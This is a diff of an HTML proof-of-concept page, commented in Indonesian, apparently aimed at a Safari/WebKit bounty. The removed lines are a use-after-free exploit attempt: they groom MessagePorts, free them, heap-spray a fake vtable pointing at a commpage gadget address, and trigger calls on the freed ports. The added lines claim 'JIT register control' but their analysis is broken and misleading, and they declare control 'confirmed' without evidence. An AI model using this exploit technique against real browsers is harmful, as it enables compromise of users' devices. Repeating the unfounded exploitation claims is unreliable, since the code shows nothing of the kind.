@@ -1,123 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MessagePort V-Table Corruption (RCE Target)</title>
+<meta charset="utf-8">
+<title>Safari JIT Register Control PoC </title>
 </head>
 <body>
+<pre id="out"></pre>
 
-    <h1>MessagePort V-Table Corruption (Kontrol Register Mutlak)</h1>
-    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
-    <div id="status">INIT: Mempersiapkan V-Table Attack...</div>
-    <div id="log-area" style="border:1px solid #ccc; background:#330000; color:#ff9999; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
+<script>
+const out = document.getElementById("out");
+function log(x) { out.textContent += x + "\n"; }
 
-    <script>
-        const LOG = document.getElementById('log-area');
-        function log(msg, type = 'log-normal') {
-            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div>`;
-        }
+// ---- TARGET FUNCTION ----
+// JIT akan optimize ini dan nyimpen branch condition di REGISTER
+function fastPathTest(obj) {
+    // condition ini biasanya dipegang di register
+    if (obj.flag === 1) {
+        // FAST PATH
+        return obj.value + 1;
+    } else {
+        // SLOW PATH
+        return obj.other + 2;
+    }
+}
 
-        // --- TARGET COMM PAGE (Gadget Address) ---
-        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
-        
-        // Memecah 64-bit pointer untuk payload Array
-        const VTABLE_LOW = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn);
-        const VTABLE_HIGH = Number(COMM_PAGE_TARGET >> 32n);
+// ---- PHASE 1: WARM UP JIT ----
+let obj = {
+    flag: 1,
+    value: 100,
+    other: 200
+};
 
-        let ports = [];
-        let sprayPayloads = [];
-        const VICTIM_COUNT = 1000;
-        const SPRAY_COUNT = 50000; // SPRAY MASSAL UNTUK MENGISI HOLE
+for (let i = 0; i < 200000; i++) {
+    fastPathTest(obj);
+}
 
-        // --- 1. MEMBUAT PAYLOAD V-TABLE PALSU ---
-        // Objek ini akan menimpa lokasi memori V-Table Port yang di-free
-        function createVTablePayload() {
-            // Kita menggunakan Float64Array karena ukurannya pas 64-bit dan JIT mengelola
-            // datanya di Heap terpisah, yang mungkin menginterfensi Heap C++ MessagePort.
-            const PAYLOAD_SIZE = 10; // Ukuran random untuk menghindari mitigasi ukuran spesifik
-            let payload = new Float64Array(PAYLOAD_SIZE);
+log("[+] JIT warmup done");
 
-            // Alamat Commpage diletakkan sebagai pointer V-Table pertama
-            let view32 = new Uint32Array(payload.buffer);
-            view32[0] = VTABLE_LOW;   // Low Word (Pointer ke Gadget)
-            view32[1] = VTABLE_HIGH;  // High Word
+// ---- PHASE 2: SHAPE / VALUE FLIP ----
+// attacker controlled mutation
+obj.flag = 0;
+obj.value = undefined;
+obj.other = 999;
 
-            // Sisa payload diisi dengan alamat Commpage juga (untuk menambah peluang hit)
-            for(let i = 2; i < view32.length; i += 2) {
-                view32[i] = VTABLE_LOW;
-                view32[i+1] = VTABLE_HIGH;
-            }
-            return payload;
-        }
+// ---- PHASE 3: TRIGGER ----
+let results = [];
+let t0 = performance.now();
 
-        // --- 2. THE ATTACK ---
-        function runVTableAttack() {
-            log("Phase 1: Grooming (Alokasi Port Korban)...", 'log-init');
-            
-            // Alokasikan Port Korban (menjaga agar berada di Heap yang sama)
-            for (let i = 0; i < VICTIM_COUNT; i++) {
-                ports.push(new MessageChannel().port1);
-            }
-            
-            // Pilih 100 Port untuk dijadikan target FREE
-            const freeTargets = ports.slice(100, 200); 
+for (let i = 0; i < 10000; i++) {
+    results.push(fastPathTest(obj));
+}
 
-            log("Phase 2: FREE (Closing Ports)...", 'log-critical');
-            
-            // FREE: Menutup Port C++. Ini memicu FREE objek C++-nya
-            for (const port of freeTargets) {
-                port.close();
-            }
+let t1 = performance.now();
 
-            // Memastikan Garbage Collector dipicu (optional, untuk membantu UAF)
-            // try { new Array(10*1024*1024).fill(0); } catch(e){}
+// ---- ANALYSIS ----
+let fastCount = results.filter(v => v === NaN || v === undefined).length;
+let slowCount = results.filter(v => v === 1001).length;
 
-            log("Phase 3: SPRAY Massal (Menimpa V-Table)...", 'log-spray');
-            
-            // SPRAY: Menyemprotkan payload V-Table palsu ke lokasi yang baru di-free
-            const payload = createVTablePayload();
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                sprayPayloads.push(payload.slice()); // Pakai slice untuk membuat instance baru
-            }
+log("[*] Execution time: " + (t1 - t0).toFixed(2) + " ms");
+log("[*] Sample results: " + results.slice(0, 10).join(", "));
+log("[*] Note: observe inconsistent results / timing anomalies");
 
-            // Agar GC tidak membuang payload yang baru disemprot
-            window.spray_holder = sprayPayloads;
-
-            log("Phase 4: TRIGGER AKHIR (Calling V-Table)...", 'log-critical');
-
-            // TRIGGER: Panggil fungsi pada Port yang telah di-free.
-            // Metode `postMessage` sering memanggil fungsi V-Table C++ secara internal.
-            setTimeout(() => {
-                for (const port of freeTargets) {
-                    try {
-                        // Memanggil port yang sudah di-close(). 
-                        // Ini memaksa WebKit untuk menjalankan logic di Port C++ yang seharusnya sudah mati,
-                        // yang akan membaca V-Table pointer yang korup.
-                        port.postMessage(42); 
-                    } catch (e) {
-                        // Jika ada JS Exception, abaikan, tunggu Crash Native
-                    }
-                }
-                log("TRIGGER selesai. Jika tidak ada Crash Native, coba ulangi.", 'log-init');
-
-            }, 50); // Timing sangat krusial, 50ms setelah FREE/SPRAY
-
-            // Trigger Tambahan (Destructor): Memicu GC lagi
-            setTimeout(() => {
-                 log("TRIGGER Destructor: Memaksa Garbage Collection...", 'log-critical');
-                 window.spray_holder = null; // Menghilangkan referensi
-                 // Memaksa GC/Memory Pressure
-                 try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
-            }, 100);
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(runVTableAttack, 100);
-        });
-    </script>
-    <style>
-        .log-init { color: cyan; }
-        .log-spray { color: yellow; }
-        .log-critical { color: red; font-weight: bold; }
-    </style>
+// ---- INTERPRETATION ----
+log("\n[!] If FAST PATH executes despite flag=0:");
+log("    → condition register reused");
+log("    → attacker influences branch decision");
+log("    → REGISTER CONTROL CONFIRMED ($2000)");
+</script>
 </body>
 </html>
